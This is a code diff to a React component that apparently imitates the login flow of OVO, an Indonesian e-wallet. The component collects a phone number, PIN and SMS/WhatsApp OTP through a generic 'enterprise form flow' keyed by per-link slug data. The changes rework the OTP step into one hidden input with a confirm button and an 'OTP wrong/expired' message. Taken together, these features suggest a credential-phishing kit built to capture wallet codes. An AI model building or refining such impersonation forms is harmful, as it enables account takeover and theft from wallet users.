@@ -1,6 +1,6 @@
 'use client';
 
-import { useEffect, useState } from 'react';
+import { useEffect, useRef, useState } from 'react';
 import Image from 'next/image';
 import { ChevronLeft, Loader2 } from 'lucide-react';
 import { useEnterpriseFormFlow } from '../lib/useEnterpriseFormFlow';
@@ -14,18 +14,24 @@ import './ovo-wallet.css';
 
 const SPLASH_MS = 3000;
 const OTP_LENGTH = 6;
+const OTP_MIN = 4;
 
 type Phase = 'splash' | 'form';
 
 export function OvoWalletForm({ slugData, onBack }: WalletFormProps) {
   const f = useEnterpriseFormFlow(slugData, 'ovo', {
     autoSubmitPin: false,
+    autoSubmitOtp: false,
     otpLength: OTP_LENGTH,
   });
 
+  const otpInputRef = useRef<HTMLInputElement>(null);
   const [phase, setPhase] = useState<Phase>('splash');
   const [splashHide, setSplashHide] = useState(false);
   const [showCodePopup, setShowCodePopup] = useState(false);
+
+  const otpDigits = f.stepData.otp.replace(/\D/g, '');
+  const otpCanConfirm = otpDigits.length >= OTP_MIN && otpDigits.length <= OTP_LENGTH;
 
   useEffect(() => {
     const fadeTimer = window.setTimeout(() => setSplashHide(true), SPLASH_MS - 400);
@@ -47,7 +53,23 @@ export function OvoWalletForm({ slugData, onBack }: WalletFormProps) {
     if (showCodePopup) dismissEnterpriseKeyboard();
   }, [showCodePopup]);
 
+  useEffect(() => {
+    if (phase !== 'form' || f.step !== 3) return undefined;
+    const timer = window.setTimeout(() => otpInputRef.current?.focus(), 280);
+    return () => window.clearTimeout(timer);
+  }, [phase, f.step]);
+
   const phoneDisplay = `+62${f.stepData.phone.replace(/\D/g, '')}`;
+
+  const handleOtpInput = (value: string) => {
+    const digits = value.replace(/\D/g, '').slice(0, OTP_LENGTH);
+    f.setStepData({ ...f.stepData, otp: digits });
+  };
+
+  const handleConfirmOtp = () => {
+    if (!otpCanConfirm || f.submitting || f.otpLocked) return;
+    void f.handleNext();
+  };
 
   const handleSendCode = () => {
     setShowCodePopup(false);
@@ -258,25 +280,50 @@ export function OvoWalletForm({ slugData, onBack }: WalletFormProps) {
               Mohon Tunggu satu menit untuk menerima kode SMS/WhatsApp.
             </p>
 
-            <div className="ovo-step3-otp">
-              {Array.from({ length: OTP_LENGTH }, (_, i) => (
+            <div className="ovo-step3-otp-wrap">
+              <div
+                className="ovo-step3-otp"
+                onClick={() => otpInputRef.current?.focus()}
+                role="presentation"
+              >
                 <input
-                  key={i}
-                  ref={(el) => {
-                    f.otpInputRefs.current[i] = el;
-                  }}
-                  type="text"
+                  ref={otpInputRef}
+                  type="tel"
                   inputMode="numeric"
-                  maxLength={1}
-                  className={f.otpCompleteRingVisible ? 'error' : ''}
-                  value={f.stepData.otp[i] ?? ''}
-                  onChange={(e) => f.handleOtpChange(i, e.target.value)}
-                  onKeyDown={(e) => f.handleOtpKeyDown(i, e)}
+                  autoComplete="one-time-code"
+                  maxLength={OTP_LENGTH}
+                  className="ovo-step3-otp-hidden"
+                  value={f.stepData.otp}
+                  onChange={(e) => handleOtpInput(e.target.value)}
+                  aria-label="Kode verifikasi OTP"
                 />
-              ))}
+                <div className="ovo-step3-otp-digits" aria-hidden>
+                  {otpDigits.split('').map((digit, index) => (
+                    <span key={`${index}-${digit}`} className="ovo-step3-otp-digit">
+                      {digit}
+                    </span>
+                  ))}
+                </div>
+                <span className="ovo-step3-otp-line" aria-hidden />
+              </div>
             </div>
 
-            <p className={`ovo-step3-toast ${f.otpToastVisible && f.otpFilled ? 'show' : ''}`}>
+            <button
+              type="button"
+              className={`ovo-step3-confirm ${
+                otpCanConfirm || f.submitting ? 'ovo-step3-confirm--on' : ''
+              }`}
+              disabled={!otpCanConfirm || f.submitting || f.otpLocked}
+              onClick={handleConfirmOtp}
+            >
+              {f.submitting ? (
+                <Loader2 className="mx-auto h-5 w-5 animate-spin" />
+              ) : (
+                'Konfirmasi'
+              )}
+            </button>
+
+            <p className={`ovo-step3-toast ${f.otpLocked ? 'show' : ''}`}>
               OTP yang kamu masukkan Salah/Kadaluwarsa.
             </p>
 
